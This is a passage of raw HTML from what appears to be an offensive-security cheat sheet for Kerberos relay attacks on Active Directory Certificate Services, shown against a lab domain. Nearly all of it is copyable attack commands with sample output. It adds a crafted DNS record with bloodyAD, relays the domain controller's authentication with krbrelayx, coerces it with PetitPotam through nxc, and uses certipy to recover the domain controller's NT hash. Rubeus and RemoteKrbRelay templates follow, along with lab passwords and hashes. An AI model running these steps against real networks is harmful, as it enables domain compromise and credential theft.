</span></span></span></div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -k --host <span class="o editable-keyword">&lt;DC&gt;</span> add dnsRecord '<span class="o editable-keyword">&lt;DC_HOSTNAME&gt;</span>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <span class="o editable-keyword">&lt;LOCAL_IP&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> bloodyAD -u <span class="s1">'Rosie.Powell'</span> -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord <span class="s1">'DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA'</span> 10.10.14.79
</span></span><span class="line"><span class="cl"><span class="go">[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
</span></span></span></div></pre></div><h4 id="2-setup-ntlm-relay">2. Setup NTLM Relay</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 krbrelayx.py -t <span class="o editable-keyword">&lt;TARGET_URL&gt;</span> --adcs --template DomainController -smb2support -v '<span class="o editable-keyword">&lt;DC_HOSTNAME&gt;</span>$'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> python3 krbrelayx.py -t http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp --adcs --template DomainController -smb2support -v <span class="s1">'DC-JPQ225$'</span>
</span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client SMB loaded..
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client HTTPS loaded..
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client HTTP loaded..
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client LDAPS loaded..
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client LDAP loaded..
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Running in attack mode to single host
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Running in kerberos relay mode because no credentials were specified.
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Setting up SMB Server
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Setting up HTTP Server on port 80
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Setting up DNS Server
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Servers started, waiting for connections
</span></span></span><span class="line"><span class="cl"><span class="go">[*] SMBD: Received connection from 10.129.234.48
</span></span></span><span class="line"><span class="cl"><span class="go">[*] HTTP server returned status code 200, treating as a successful login
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Generating CSR...
</span></span></span><span class="line"><span class="cl"><span class="go">[*] CSR generated!
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Getting certificate...
</span></span></span><span class="line"><span class="cl"><span class="go">[*] SMBD: Received connection from 10.129.234.48
</span></span></span><span class="line"><span class="cl"><span class="go">[*] GOT CERTIFICATE! ID 92
</span></span></span><span class="line"><span class="cl"><span class="go">[*] HTTP server returned status code 200, treating as a successful login
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Skipping user DC-JPQ225$ since attack was already performed
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Writing PKCS#12 certificate to ./DC-JPQ225.pfx
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate successfully written to file
</span></span></span></div></pre></div><h4 id="3-coerce-authentication">3. Coerce Authentication</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">nxc smb <span class="o editable-keyword">&lt;DC&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -M coerce_plus -o LISTENER=<span class="o editable-keyword">&lt;DC_HOSTNAME&gt;</span>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> nxc smb DC-JPQ225.cicada.vl -u <span class="s1">'Rosie.Powell'</span> -p <span class="s1">'Cicada123'</span> -d cicada.vl -M coerce_plus -o <span class="nv">LISTENER</span><span class="o">=</span>DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA <span class="nv">METHOD</span><span class="o">=</span>PetitPotam
</span></span><span class="line"><span class="cl"><span class="go">SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
</span></span></span><span class="line"><span class="cl"><span class="go">SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
</span></span></span><span class="line"><span class="cl"><span class="go">COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
</span></span></span><span class="line"><span class="cl"><span class="go">COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, lsarpc\EfsRpcAddUsersToFile
</span></span></span></div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">nxc smb <span class="o editable-keyword">&lt;DC&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -H '<span class="o editable-keyword">&lt;HASH&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -M coerce_plus -o LISTENER=<span class="o editable-keyword">&lt;DC_HOSTNAME&gt;</span>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> nxc smb DC-JPQ225.cicada.vl -u <span class="s1">'Rosie.Powell'</span> -H <span class="s1">'ff99630bed1e3bfd90e6a193d603113f'</span> -d cicada.vl -M coerce_plus -o <span class="nv">LISTENER</span><span class="o">=</span>DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA <span class="nv">METHOD</span><span class="o">=</span>PetitPotam
</span></span><span class="line"><span class="cl"><span class="go">SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
</span></span></span><span class="line"><span class="cl"><span class="go">SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:ff99630bed1e3bfd90e6a193d603113f 
</span></span></span><span class="line"><span class="cl"><span class="go">COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
</span></span></span><span class="line"><span class="cl"><span class="go">COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, lsarpc\EfsRpcAddUsersToFile
</span></span></span></div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">nxc smb <span class="o editable-keyword">&lt;DC&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -k -M coerce_plus -o LISTENER=<span class="o editable-keyword">&lt;DC_HOSTNAME&gt;</span>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> nxc smb DC-JPQ225.cicada.vl -u <span class="s1">'Rosie.Powell'</span> -p <span class="s1">'Cicada123'</span> -d cicada.vl -k -M coerce_plus -o <span class="nv">LISTENER</span><span class="o">=</span>DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA <span class="nv">METHOD</span><span class="o">=</span>PetitPotam
</span></span><span class="line"><span class="cl"><span class="go">SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
</span></span></span><span class="line"><span class="cl"><span class="go">SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
</span></span></span><span class="line"><span class="cl"><span class="go">COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
</span></span></span><span class="line"><span class="cl"><span class="go">COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, lsarpc\EfsRpcAddUsersToFile
</span></span></span></div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">nxc smb <span class="o editable-keyword">&lt;DC&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -H '<span class="o editable-keyword">&lt;HASH&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -k -M coerce_plus -o LISTENER=<span class="o editable-keyword">&lt;DC_HOSTNAME&gt;</span>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> nxc smb DC-JPQ225.cicada.vl -u <span class="s1">'Rosie.Powell'</span> -H <span class="s1">'ff99630bed1e3bfd90e6a193d603113f'</span> -d cicada.vl -k -M coerce_plus -o <span class="nv">LISTENER</span><span class="o">=</span>DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA <span class="nv">METHOD</span><span class="o">=</span>PetitPotam
</span></span><span class="line"><span class="cl"><span class="go">SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
</span></span></span><span class="line"><span class="cl"><span class="go">SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:ff99630bed1e3bfd90e6a193d603113f 
</span></span></span><span class="line"><span class="cl"><span class="go">COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
</span></span></span><span class="line"><span class="cl"><span class="go">COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, lsarpc\EfsRpcAddUsersToFile
</span></span></span></div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">nxc smb <span class="o editable-keyword">&lt;DC&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -k --kdcHost <span class="o editable-keyword">&lt;DC&gt;</span> --use-kcache -M coerce_plus -o LISTENER=<span class="o editable-keyword">&lt;DC_HOSTNAME&gt;</span>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> nxc smb DC-JPQ225.cicada.vl -u <span class="s1">'Rosie.Powell'</span> -d cicada.vl -k --kdcHost DC-JPQ225.cicada.vl --use-kcache -M coerce_plus -o <span class="nv">LISTENER</span><span class="o">=</span>DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA <span class="nv">METHOD</span><span class="o">=</span>PetitPotam
</span></span><span class="line"><span class="cl"><span class="go">SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
</span></span></span><span class="line"><span class="cl"><span class="go">SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell from ccache 
</span></span></span><span class="line"><span class="cl"><span class="go">COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
</span></span></span><span class="line"><span class="cl"><span class="go">COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, lsarpc\EfsRpcAddUsersToFile
</span></span></span></div></pre></div><h4 id="5-get-ntlm-hash">5. Get NTLM Hash</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad auth -pfx <span class="o editable-keyword">&lt;DC_HOSTNAME&gt;</span>.pfx -domain <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad auth -pfx DC-JPQ225.pfx -domain cicada.vl -dc-ip 10.129.234.48
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Certificate identities:
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using principal: 'dc-jpq225$@cicada.vl'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to get TGT...
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got TGT
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving credential cache to 'dc-jpq225.ccache'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote credential cache to 'dc-jpq225.ccache'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to retrieve NT hash for 'dc-jpq225$'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
</span></span></span></div></pre></div></div><div class="tabcontent" data-tabset="set11" data-tabcontent="tab2"><h4 id="1-setup">1. Setup</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">+-------------------------------------------------+
</span></span></span><span class="line"><span class="cl"><span class="go">| 1. Join Domain                                  |
</span></span></span><span class="line"><span class="cl"><span class="go">| 2. Config DNS                                   |
</span></span></span><span class="line"><span class="cl"><span class="go">| 3. Config C:\Windows\System32\drivers\etc\hosts |
</span></span></span><span class="line"><span class="cl"><span class="go">+-------------------------------------------------+
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="2-request-a-ticket">2. Request a Ticket</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe asktgt /user:'<span class="o editable-keyword">&lt;USER&gt;</span>' /password:'<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' /enctype:AES256 /domain:'<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' /dc:'<span class="o editable-keyword">&lt;DC&gt;</span>' /ptt /nowrap
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="3-check">3. Check</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">klist
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="4-remotekrbrelay">4. RemoteKrbRelay</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\RemoteKrbRelay.exe -adcs -template DomainController -victim <span class="o editable-keyword">&lt;VICTIM&gt;</span> -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="5-convert-base64-encoded-cert-to-p12">5. Convert Base64 Encoded Cert to p12</h4>
